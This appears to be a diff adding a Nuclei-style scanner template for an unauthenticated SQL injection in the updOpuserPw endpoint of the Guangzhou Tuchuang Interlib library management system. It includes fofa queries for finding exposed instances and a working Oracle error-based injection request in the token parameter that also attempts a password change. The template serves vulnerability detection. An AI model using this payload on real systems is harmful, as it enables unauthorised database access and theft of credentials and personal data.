@@ -1,0 +1,29 @@
+id: tuchuang-updOpuserPw-sql
+
+info:
+  name: "广州图创 图书馆集群管理系统 updOpuserPw 接口 SQL 注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="interlib/common/" || body="Interlib图书馆集群管理系统" || body="/interlib3/system_index" || body="打开Interlib主界面"
+      广州图创 图书馆集群管理系统 updOpuserPw 接口存在SQL注入漏洞。攻击者可利用该漏洞执行恶意SQL语句，导致数据库敏感信息泄露（如管理员凭据、用户个人信息），并在具备高权限条件下实施远程代码执行或服务器控制。该漏洞无需身份验证即可被远程触发，可能引发数据篡改、服务中断及横向渗透等安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s/4kpHfyQC3uj8_N8LkQudlQ
+  tags: 广州图创
+
+http:
+- raw:
+  - |
+    GET /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%209999*9999%20from%20dual))=%272 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '99980001'
+  - type: status
+    status:
+    - 200
